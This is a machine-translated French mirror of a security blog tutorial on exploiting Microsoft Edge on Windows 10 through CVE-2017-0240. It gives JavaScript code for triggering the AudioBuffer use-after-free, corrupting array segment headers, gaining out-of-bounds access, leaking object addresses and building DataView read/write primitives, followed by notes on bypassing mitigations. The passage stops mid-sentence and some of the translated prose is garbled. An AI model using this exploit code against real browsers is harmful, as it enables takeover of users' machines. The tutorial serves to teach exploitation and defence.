<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>‚úîÔ∏è üîã üë®‚Äçüî¨ Microsoft Edge de CVE √† RCE sur Windows 10 üç§ ü§ê üò£</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Dans le cadre de cet article, nous consid√©rerons de mani√®re suffisamment d√©taill√©e le processus d'√©criture d'un exploit pour une vuln√©rabilit√© dans Mi...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Microsoft Edge de CVE √† RCE sur Windows 10</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/455594/"><p><img src="https://habrastorage.org/webt/l6/oc/0a/l6oc0axkoxyoiss6dr77cytm1_e.jpeg" alt="Intro"></p><br><p>  Dans le cadre de cet article, nous consid√©rerons de mani√®re suffisamment d√©taill√©e le processus d'√©criture d'un exploit pour une vuln√©rabilit√© dans Microsoft Edge, avec la sortie ult√©rieure du sandbox.  Si vous souhaitez savoir √† quoi ressemble ce processus, bienvenue sous cat! </p><a name="habracut"></a><br><h2 id="vvedenie">  Pr√©sentation </h2><br><p> Lors du dernier <code>Pwn2Own 2019</code> √† Montr√©al, dans la cat√©gorie des navigateurs, un exploit pour pirater <code>Microsoft Edge</code> √©t√© <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">d√©montr√©</a> .  Deux vuln√©rabilit√©s ont √©t√© utilis√©es pour cela: <code>double free</code> dans le moteur de rendu et une vuln√©rabilit√© logique pour quitter le bac √† sable.  Ces deux vuln√©rabilit√©s ont r√©cemment √©t√© corrig√©es et affect√©es au <code>CVE</code> correspondant: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><code>CVE-2019-0940</code></a> et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><code>CVE-2019-0938</code></a> .  Vous pouvez en savoir plus sur les vuln√©rabilit√©s dans le blog: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Pwn2Own 2019: Microsoft Edge Renderer Exploitation (CVE-2019-0940).</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Partie 1</a> et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Pwn2Own 2019: Microsoft Eedge Sandbox Escape (CVE-2019-0938).</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">2e partie</a> . </p><br><p>  Dans le cadre de notre article, nous voulons montrer le processus d'√©criture d'un tel exploit et combien de temps et de ressources sont n√©cessaires pour cela en utilisant l'exemple de <code>Microsoft Edge</code> sur <code>Windows 10</code> utilisant <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><code>CVE-2017-0240</code></a> et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><code>CVE-2016-3309</code></a> .  L'une des diff√©rences sera que si l'exploit d√©montr√© sur <code>Pwn2Own</code> utilis√© une vuln√©rabilit√© logique pour quitter le bac √† sable, alors dans notre sc√©nario, la vuln√©rabilit√© dans le noyau <code>Windows 10</code> sera utilis√©e pour quitter le bac √† sable.  Comme <code>Microsoft</code> montrent les correctifs de <code>Microsoft</code> , il y a beaucoup plus de vuln√©rabilit√©s dans le noyau que de vuln√©rabilit√©s dans l'impl√©mentation du sandbox.  En cons√©quence, une telle cha√Æne de vuln√©rabilit√©s est beaucoup plus susceptible d'√™tre rencontr√©e, et il sera utile de la conna√Ætre pour les employ√©s du SI dans les entreprises. </p><br><h2 id="ishodnye-dannye">  Donn√©es source </h2><br><p>  Cet article couvrira le processus d'√©criture d'un exploit d'une journ√©e pour le navigateur <code>Microsoft Edge</code> .  <code>CVE-2017-0240</code> sera exploit√©.  La premi√®re √©tape de l'op√©ration sera effectu√©e sur la base de mat√©riaux provenant de la source [1], nous obtiendrons une primitive de <code>arbitrary address read/write</code> , et nous nous familiariserons √©galement avec diverses techniques qui peuvent √™tre utiles lors de l'exploitation de telles vuln√©rabilit√©s.  Ensuite, nous vous pr√©senterons l'outil <code>pwn.js</code> , qui vous aidera √† obtenir un appel √† des fonctions arbitraires bas√©es sur la lecture et l'√©criture arbitraires, et examinera √©galement diverses <code>mitigations</code> et fa√ßons de les contourner.  √Ä la derni√®re √©tape, la vuln√©rabilit√© du noyau Windows <code>CVE-2016-3309</code> sera exploit√©e pour augmenter les privil√®ges, contourner les restrictions <code>AppContainer</code> et obtenir un contr√¥le complet sur la machine attaqu√©e. </p><br><p>  L'op√©ration sera effectu√©e sur le stand avec <code>Microsoft Windows 10 Pro 1703 (10.0.15063)</code> et le navigateur <code>Microsoft Edge (40.15063.0.0)</code> . </p><br><h2 id="shag-1-poluchenie-arbitrary-address-readwrite-primitiva">  √âtape 1. Obtention d'une primitive de <code>arbitrary address read/write</code> </h2><br><h3 id="opisanie-uyazvimosti-i-poluchenie-oob">  Description de la vuln√©rabilit√© et obtention d' <code>OOB</code> </h3><br><p>  Une vuln√©rabilit√© de type <code>use-after-free</code> pr√©sente dans la m√©thode <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">copyFromChannel</a> de l'objet <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Audio Buffer</a> . </p><br><blockquote>  AudioBuffer est l'interface d'un court √©l√©ment audio situ√© en m√©moire et cr√©√© √† partir d'un fichier audio √† l'aide de la m√©thode AudioContext.decodeAudioData (), ou √† partir des donn√©es source √† l'aide de la m√©thode AudioContext.createBuffer ().  Les donn√©es audio plac√©es dans AudioBuffer peuvent √™tre lues dans AudioBufferSourceNode. </blockquote><p>  La pr√©sentation de <code>The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</code> fournit une analyse d√©taill√©e de la vuln√©rabilit√© et du correctif.  Lorsque la m√©thode <code>copyFromChannel</code> est <code>copyFromChannel</code> , le contenu du canal de tampon audio est copi√© dans le tampon de <code>destination</code> sp√©cifi√© par le premier argument.  La m√©thode accepte √©galement le num√©ro de canal ( <code>channelNumber</code> ) et le d√©calage dans le tampon audio ( <code>startInChannel</code> ), √† partir desquels la copie est n√©cessaire.  Avant de copier directement les donn√©es vers la <code>destination</code> dans la fonction <code>CDOMAudioBuffer::Var_copyFromChannel</code> , le tampon de <code>destination</code> est mis en cache (l'adresse et la taille du tampon sont stock√©es dans les variables de fonction locales sur la pile) et les valeurs d'objet <code>channelNumber</code> et <code>startInChannel</code> sont <code>startInChannel</code> en type <code>Int</code> , pour lequel la m√©thode <code>valueOf</code> des objets convertis est appel√©e.  La vuln√©rabilit√© est qu'un tampon mis en cache peut √™tre lib√©r√© au moment de la conversion de type dans la m√©thode substitu√©e de l'objet <code>valueOf</code> .  Pour la v√©rification, nous utilisons le code suivant: </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">// ,     var t2 = new Float32Array(0x20000); var ta = new Uint8Array(t2.buffer); for (i=0;i&lt;t2.length;i++) t2[i] = 0x66; var myctx = new AudioContext(); var audioBuf = myctx.createBuffer(1, 0x25, 22050); //   -   var t = audioBuf.getChannelData(0); var ta2 = new Uint8Array(t.buffer); for(i=0;i&lt;ta2.length;i++) ta2[i]=0x55; //     valueOf var obj = { valueOf: function () { //   var worker = new Worker('worker.js'); worker.postMessage(0, [t2.buffer]); worker.terminate(); worker = null; //    sleep(1000); return 0; } }; //   audioBuf.copyFromChannel(t2, obj, 0);</span></span></code> </pre> <br><p>  Ce code utilise la technologie <code>Web Workers</code> pour lib√©rer le tampon.  Apr√®s avoir cr√©√© un <code>Worker</code> vide, nous pouvons lui envoyer un message en utilisant la m√©thode <code>postMessage</code> .  Le deuxi√®me argument de <code>transfer</code> facultatif de cette m√©thode prend un tableau d'objets <code>Transferable</code> ( <code>ArrayBuffer</code> , <code>MessagePost</code> ou <code>ImageBitmap</code> ), les droits sur l'objet seront transf√©r√©s vers <code>Worker</code> et l'objet ne sera plus disponible dans le contexte actuel, il peut donc √™tre supprim√©.  Apr√®s cela, un appel √† <code>sleep</code> se produit - une fonction qui arr√™te temporairement l'ex√©cution d'un programme (il est impl√©ment√© ind√©pendamment).  Cela est n√©cessaire pour que le syst√®me de collecte des ordures ( <code>GC</code> , <code>Garbage Collector</code> ) parvienne √† lib√©rer le tampon, dont les droits ont √©t√© transf√©r√©s. </p><br><blockquote>  Les travailleurs Web fournissent un moyen simple d'ex√©cuter des scripts dans le thread d'arri√®re-plan.  Le thread de travail peut effectuer des t√¢ches sans interf√©rer avec l'interface utilisateur.  En outre, ils peuvent effectuer des E / S √† l'aide de XMLHttpRequest (bien que les attributs responseXML et channel seront toujours nuls).  Un Worker existant peut envoyer des messages JavaScript au code cr√©ateur via le gestionnaire d'√©v√©nements sp√©cifi√© par ce code (et vice versa). </blockquote><p>  En ex√©cutant ce code dans Edge sous le d√©bogueur, vous pouvez obtenir le plantage suivant. </p><br><p><img src="https://habrastorage.org/webt/iv/vx/zx/ivvxzxzff-qsxl8pxdqy6pmkbnq.png" alt="Crash de l'√©tape 01"></p><br><p>  Par cons√©quent, l'appel √† <code>copyFromChannel</code> tente de copier le contenu du tampon audio dans la zone de m√©moire non allou√©e.  Pour exploiter la vuln√©rabilit√©, il est n√©cessaire de r√©aliser l'allocation des objets dans cette zone m√©moire.  Dans ce cas, le segment de matrice est parfait. </p><br><p>  Les tableaux dans <code>Chakra</code> (le moteur <code>JS</code> utilis√© dans le navigateur <code>Edge</code> ) sont organis√©s comme suit: l'objet tableau a une taille fixe, les pointeurs vers les objets tableau (ou les valeurs, dans le cas d' <code>IntArray</code> ) sont stock√©s dans une zone de m√©moire distincte - le segment, le pointeur vers lequel est contenu dans l'objet tableau.  L'en-t√™te de segment contient diverses informations, notamment la taille du segment, qui correspond √† la taille du tableau.  La taille du tableau est √©galement pr√©sente dans l'objet tableau lui-m√™me.  Sch√©matiquement, cela ressemble √† ceci: </p><br><p><img src="https://habrastorage.org/webt/kh/i1/wr/khi1wrtatqg2jq2bkhaz29b7u68.jpeg" alt="Structure du tableau"></p><br><p>  Ainsi, si nous parvenons √† s√©lectionner le segment de tableau dans l'espace pr√©c√©demment lib√©r√©, nous pouvons alors remplacer l'en-t√™te du segment de tableau par le contenu du tampon audio.  Pour ce faire, nous modifions le code ci-dessus en ajoutant les lignes suivantes apr√®s <code>sleep(1000);</code>  : </p><br><pre> <code class="javascript hljs">... <span class="hljs-comment"><span class="hljs-comment">/*        ,    .   arr        */</span></span> arr = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">128</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arr.length; i++) { arr[i] = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">0x3ff0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> j = <span class="hljs-number"><span class="hljs-number">0</span></span>; j &lt; arr[i].length; j++) arr[i][j] = <span class="hljs-number"><span class="hljs-number">0x30303030</span></span>; } ...</code> </pre> <br><p>  La taille des matrices est s√©lectionn√©e de telle mani√®re que la taille du segment de matrice occupe un segment de segment de m√©moire entier (la partie minimale indivisible de la m√©moire de segment de m√©moire, dont la taille est 0x10000 octets).  Ex√©cutez ce code en sp√©cifiant la fonction <code>memcpy</code> comme point d'arr√™t (il y aura de nombreux appels <code>memcpy</code> , il est donc logique de s'arr√™ter d'abord √† <code>edgehtml!WebCore::AudioBufferData::copyBufferData</code> ), dans lequel le crash s'est produit.  On obtient le r√©sultat suivant: </p><br><p><img src="https://habrastorage.org/webt/nn/5u/yn/nn5uyncl0hvooyoar3lnua8cc8u.png" alt="√âtape 02"></p><br><p>  Super!  Maintenant, nous pouvons remplacer l'en-t√™te du segment de tableau avec nos propres valeurs.  Les valeurs les plus int√©ressantes dans ce cas sont la taille du tableau, dont le d√©calage peut √™tre vu dans la capture d'√©cran ci-dessus.  Modifiez le contenu du tampon audio comme suit: </p><br><pre> <code class="javascript hljs">... var t = audioBuf.getChannelData(<span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ta2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Uint32Array</span></span>(t.buffer); ta2[<span class="hljs-number"><span class="hljs-number">0</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">1</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">2</span></span>] = <span class="hljs-number"><span class="hljs-number">0xffe0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">3</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">4</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">5</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">6</span></span>] = <span class="hljs-number"><span class="hljs-number">0xfba6</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">7</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">8</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">9</span></span>] = <span class="hljs-number"><span class="hljs-number">0x7fffffff</span></span> - <span class="hljs-number"><span class="hljs-number">2</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">10</span></span>] = <span class="hljs-number"><span class="hljs-number">0x7fffffff</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">11</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">12</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">13</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">14</span></span>] = <span class="hljs-number"><span class="hljs-number">0x40404040</span></span>; ta2[<span class="hljs-number"><span class="hljs-number">15</span></span>] = <span class="hljs-number"><span class="hljs-number">0x50505050</span></span>; ...</code> </pre> <br><p>  Faites attention aux valeurs de <code>ta2[14]</code> et <code>ta2[15]</code> - elles se r√©f√®rent d√©j√† non pas √† l'en-t√™te de segment, mais aux valeurs du tableau elles-m√™mes.  Avec cela, nous pouvons d√©terminer le tableau dont nous avons besoin dans le tableau <code>arr</code> global comme suit: </p><br><pre> <code class="javascript hljs">... for(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; arr.length; i++) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(arr[i][<span class="hljs-number"><span class="hljs-number">0</span></span>] == <span class="hljs-number"><span class="hljs-number">0x40404040</span></span> &amp;&amp; arr[i][<span class="hljs-number"><span class="hljs-number">1</span></span>] == <span class="hljs-number"><span class="hljs-number">0x50505050</span></span>) { alert(<span class="hljs-string"><span class="hljs-string">'Target array idx: '</span></span> + i); target_idx = i; target_arr = arr[i]; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } }</code> </pre> <br><p>  Si par cons√©quent un tableau a √©t√© trouv√©, dont les deux premiers √©l√©ments ont √©t√© modifi√©s d'une certaine mani√®re, alors tout va bien.  Nous avons maintenant un tableau dont la taille de segment est plus grande qu'elle ne l'est r√©ellement.  Les tableaux restants peuvent √™tre lib√©r√©s. </p><br><p>  Ici, il faut se rappeler que la taille du tableau existe en deux entit√©s: dans l'objet tableau, o√π il est rest√© inchang√©, et dans le segment du tableau, o√π nous l'avons augment√©.  Il s'av√®re que la taille de l'objet tableau est ignor√©e si le code est ex√©cut√© en mode <code>JIT</code> et a √©t√© optimis√©.  Ceci est facilement r√©alis√©, par exemple, comme suit: </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arr_get</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">idx</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> target_arr[idx]; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">arr_set</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">idx, val</span></span></span><span class="hljs-function">) </span></span>{ target_arr[idx] = val; } <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; <span class="hljs-number"><span class="hljs-number">0x3ff0</span></span>; i++) { arr_set(i, arr_get(i)); }</code> </pre> <br><p>  Apr√®s cela, en utilisant les fonctions <code>arr_get</code> et <code>arr_set</code> vous pouvez aller au-del√† des limites du tableau ( <code>OOB</code> , <code>out-of-bound</code> ). </p><br><h3 id="ispolzovanie-oob-dlya-polucheniya-primitiva-chteniya-i-zapisi-po-proizvolnomu-adresu">  Utiliser <code>OOB</code> pour obtenir la primitive de lecture et d'√©criture √† une adresse arbitraire </h3><br><p>  Dans cette section, nous consid√©rons une technique qui vous permet de lire et d'√©crire sur une adresse arbitraire en utilisant <code>OOB</code> .  La m√©thode par laquelle nous obtenons ceci sera similaire √† celle utilis√©e dans la source [1], mais il y aura √©galement des changements importants. </p><br><p>  Dans la version utilis√©e d' <code>Edge</code> les blocs de m√©moire pour le tas sont allou√©s s√©quentiellement, en raison de quoi, lors de l'allocation d'un grand nombre d'objets, t√¥t ou tard, ils se trouveront apr√®s le segment de tableau, au-del√† duquel nous pouvons aller. </p><br><p>  Tout d'abord, il nous donne la possibilit√© de lire un pointeur vers une table virtuelle de m√©thodes objet ( <code>vftable</code> ), afin que nous puissions contourner la randomisation de l'espace d'adressage du processus ( <code>ASLR</code> ).  Mais l'acc√®s √† quels objets nous aidera √† r√©aliser une lecture et une √©criture arbitraires?  Quelques objets <code>DataView</code> sont parfaits pour cela. </p><br><blockquote>  Le DataView fournit une interface de bas niveau pour lire et √©crire plusieurs types num√©riques dans un ArrayBuffer binaire, quel que soit l'ordre des octets de la plate-forme. </blockquote><p>  La structure interne du <code>DataView</code> contient un pointeur vers un tampon.  Pour lire et √©crire dans une adresse arbitraire, par exemple, nous pouvons construire une cha√Æne de deux <code>DataView</code> ( <code>dv1</code> et <code>dv2</code> ) comme suit: en tant <code>dv1</code> tampon <code>dv1</code> sp√©cifiez l'adresse <code>dv2</code> en acc√©dant au tableau.  Maintenant, en utilisant <code>dv1</code> nous pouvons changer l'adresse du tampon <code>dv2</code> , gr√¢ce √† laquelle une lecture et une √©criture arbitraires sont r√©alis√©es.  Sch√©matiquement, cela peut √™tre repr√©sent√© comme suit: </p><br><p><img src="https://habrastorage.org/webt/ch/9n/do/ch9ndofe4zamumfvihnmv6xtg-o.jpeg" alt="Lecture / √©criture d'adresse arbitraire"></p><br><p>  Pour utiliser cette m√©thode, vous devez apprendre √† d√©terminer les adresses des objets en m√©moire.  Pour ce faire, la technique suivante existe: vous devez cr√©er un nouveau <code>Array</code> , utiliser <code>OOB</code> pour enregistrer son <code>vftable</code> et <code>typeId</code> (les deux premiers champs 64 bits de la structure) et attribuer l'objet auquel l'adresse est int√©ressante au premier √©l√©ment du tableau.  Ensuite, vous devez restaurer les <code>typeId</code> <code>vftable</code> et <code>typeId</code> pr√©c√©demment enregistr√©es.  Maintenant, le double mot junior et senior de l'adresse de l'objet peut √™tre obtenu en se r√©f√©rant au premier et au deuxi√®me √©l√©ment du tableau.  Le fait est que, par d√©faut, le nouveau tableau est <code>IntArray</code> , et les valeurs √† 4 octets du tableau sont stock√©es dans son segment telles quelles.  Lors de l'affectation d'un objet √† un tableau, le tableau est converti en un <code>ObjectArray</code> et son segment est utilis√© pour stocker les adresses des objets.  La conversion change <code>vftable</code> et <code>typeId</code> .  Par cons√©quent, si nous <code>vftable</code> valeurs d'origine <code>vftable</code> et <code>typeId</code> , gr√¢ce aux √©l√©ments de ce tableau, nous pouvons acc√©der directement au segment.  Le processus d√©crit sch√©matiquement peut √™tre repr√©sent√© comme suit: </p><br><p><img src="https://habrastorage.org/webt/un/np/-z/unnp-zlvr6ql9m5_f9rmxrdwt20.jpeg" alt="Fuite de pointeur"></p><br><p>  La fonction pour obtenir l'adresse ressemblera √† ceci: </p><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">addressOf</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">obj</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> hdr_backup = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Array</span></span>(<span class="hljs-number"><span class="hljs-number">4</span></span>); <span class="hljs-comment"><span class="hljs-comment">//  vftable  typeId intarr_object for(var i = 0; i &lt; 4; i++) hdr_backup[i] = arr_get(intarr_idx + i); intarr_object[0] = obj; //  vftable  typeId intarr_object for(var i = 0; i &lt; 4; i++) arr_set(intarr_idx + i, hdr_backup[i]); //         return [intarr_object[0], intarr_object[1]]; }</span></span></code> </pre> <br><p>  Une question ouverte reste la cr√©ation des objets n√©cessaires et leur recherche en utilisant <code>OOB</code> .  Comme mentionn√© pr√©c√©demment, lors de l'allocation d'un grand nombre d'objets, t√¥t ou tard, ils commenceront √† se d√©marquer apr√®s le segment de tableau, au-del√† duquel nous pouvons aller.  Pour trouver les objets n√©cessaires, il vous suffit de parcourir les index en dehors du tableau √† la recherche des objets n√©cessaires.  Parce que  tous les objets du m√™me type sont situ√©s dans un segment du tas, vous pouvez optimiser la recherche et parcourir les segments du tas par incr√©ments de <code>0x10000</code> , et v√©rifier uniquement les premi√®res valeurs du d√©but de chaque segment du tas.  Pour identifier les objets, vous pouvez leur attribuer des valeurs uniques pour certains param√®tres (par exemple, pour <code>DataView</code> il peut s'agir de <code>byteOffset</code> ) ou, en utilisant les constantes d√©j√† connues dans la structure de l'objet (par exemple, dans la version utilis√©e d' <code>Edge</code> dans <code>IntArray</code> , la valeur <code>0x10005</code> se trouve toujours √† <code>0x18</code> ). </p><br><p>  En combinant toutes les techniques ci-dessus, vous pouvez lire et √©crire sur une adresse arbitraire.  Ci-dessous, une capture d'√©cran de la lecture des objets de m√©moire <code>DataView</code> . </p><br><p><img src="https://habrastorage.org/webt/fe/i5/o3/fei5o3k0zh3pogdmb5diifeick8.png" alt="Fuite de m√©moire"></p><br><h2 id="shag-2-vypolnenie-proizvolnyh-funkciy-api">  √âtape 2. Ex√©cution de fonctions API arbitraires </h2><br><p>  √Ä ce stade, nous avons pu lire et √©crire sur une adresse arbitraire dans le processus d'affichage du contenu <code>Edge</code> .  Consid√©rez les principales technologies qui devraient interf√©rer avec le fonctionnement ult√©rieur de l'application et leurs solutions de contournement.  Nous avons d√©j√† √©crit une courte s√©rie d'articles <code>  app specific security mitigation</code> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">partie 1, introduction</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">partie 2, Internet Explorer et Edge</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">partie 3, Google Chrome</a> ), mais gardez √† l'esprit que les d√©veloppeurs ne restent pas immobiles et ajoutent de nouveaux outils √† leurs produits protection. </p><br><h3 id="randomizaciya-adresnogo-prostranstva-aslr">  Randomisation de l'espace d'adressage ( <code>ASLR</code> ) </h3><br><blockquote>  ASLR (randomisation de la disposition de l'espace d'adressage en anglais) est une technologie utilis√©e dans les syst√®mes d'exploitation qui modifie de mani√®re al√©atoire l'emplacement des structures de donn√©es importantes dans l'espace d'adressage du processus, √† savoir: images de fichiers ex√©cutables, biblioth√®ques charg√©es, tas et empiler. </blockquote><p>  Ci-dessus, nous avons appris √† lire les adresses des tables de classes virtuelles, en les utilisant, nous pouvons facilement calculer l'adresse de base du module <code>Chakra.dll</code> , donc <code>ASLR</code> ne pr√©sente pas de probl√®mes pour une op√©ration ult√©rieure. </p><br><h3 id="data-execution-protection-dep-nx">  Protection de l'ex√©cution des donn√©es ( <code>DEP</code> , <code>NX</code> ) </h3><br><blockquote>  La pr√©vention de l'ex√©cution des donn√©es (DEP) est une fonctionnalit√© de s√©curit√© int√©gr√©e √† Linux, Mac OS X, Android et Windows qui emp√™che une application d'ex√©cuter du code √† partir d'une zone de m√©moire marqu√©e comme ¬´donn√©es uniquement¬ª.  Cela emp√™chera certaines attaques, qui, par exemple, enregistrent du code dans une telle zone en utilisant des d√©passements de tampon. </blockquote><p>  Une fa√ßon de contourner cette protection consiste √† appeler <code>VirtualAlloc</code> aide de cha√Ænes <code>ROP</code> .  Mais dans le cas d' <code>Edge</code> cette m√©thode ne fonctionnera pas en raison de l' <code>ACG</code> (voir ci-dessous). </p><br><h3 id="control-flow-guard-cfg">  Control Flow Guard ( <code>CFG</code> ) </h3><br><blockquote>  <code>CFG</code> est un m√©canisme de protection visant √† compliquer le processus d'exploitation des vuln√©rabilit√©s binaires dans les applications utilisateur et en mode noyau.  Le travail de ce m√©canisme consiste √† valider les appels indirects, ce qui emp√™che un attaquant d'intercepter le thread d'ex√©cution (par exemple, en √©crasant le tableau des fonctions virtuelles) </blockquote><p>  Cette technologie contr√¥le uniquement les appels indirects, par exemple, les appels de m√©thode √† partir de la table virtuelle des fonctions d'objet.  Les adresses de retour sur la pile ne sont pas contr√¥l√©es, et cela peut √™tre utilis√© pour cr√©er des cha√Ænes <code>ROP</code> .  L'utilisation future des cha√Ænes <code>ROP/JOP/COP</code> peut √™tre entrav√©e par <code>Intel</code> nouvelle technologie d' <code>Intel</code> technologie de <code>Control-flow Enforcement Technology</code> ( <code>CET</code> ).  Cette technologie se compose de deux parties: </p><br><ol><li>  <code>Shadow Stack</code> (shadow stack) - utilis√© pour contr√¥ler les adresses de retour et prot√®ge contre les cha√Ænes <code>ROP</code> ; </li><li>  <code>Indirect Branch Tracking</code> est une m√©thode de protection contre les cha√Ænes <code>JOP/COP</code> .  Il s'agit d'une nouvelle instruction <code>ENDBRANCH</code> , qui marque toutes les adresses de transition valides pour <code>call</code> instructions 